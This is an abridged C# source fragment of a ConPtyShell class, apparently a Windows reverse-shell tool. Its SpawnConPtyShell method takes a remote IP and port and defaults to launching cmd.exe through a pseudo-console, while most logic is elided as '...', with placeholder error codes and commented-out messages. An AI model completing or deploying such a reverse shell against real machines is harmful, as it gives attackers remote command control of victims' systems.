...
public static class ConPtyShell
{
    ...
    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        ...
        if (!success)
        {
            throw new InvalidOperationException("E4");
        }
        ...
        if (!success)
        {
            throw new InvalidOperationException("E5");
        }
        return startupInfo;
    }
    ...
    public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine)
    {
        ...
        { //CreatePseudoConsole
            //Console.WriteLine("\r\function not found!\r\n");
        ...
        {
            //Console.WriteLine("\r\function found!\r\n");
            ...
            {
                //output += string.Format("{0}Error Code {1}", errorString, pseudoConsoleCreationResult.ToString());
                return output;
            }
...
public static class ConPtyShellMainClass
{
    ...
    private static void CheckArgs(string[] arguments)
    {
        ...
        {
            //Console.Out.Write("\r\nNot enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
    ...
    {
        string commandLine = "cmd.exe"; //powershell.exe
